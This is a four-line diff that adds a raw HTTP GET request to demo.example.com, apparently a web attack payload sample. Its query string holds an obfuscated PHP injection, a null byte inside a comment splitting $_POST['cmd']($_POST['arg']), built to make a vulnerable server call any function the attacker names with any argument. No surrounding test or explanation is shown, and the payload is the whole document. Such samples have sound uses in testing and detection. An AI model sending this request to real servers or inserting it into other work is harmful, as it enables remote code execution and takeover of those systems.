@@ -1,0 +1,4 @@
+GET /a?cmd=$_/*%00*/POST['cmd']($_POST['arg']); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
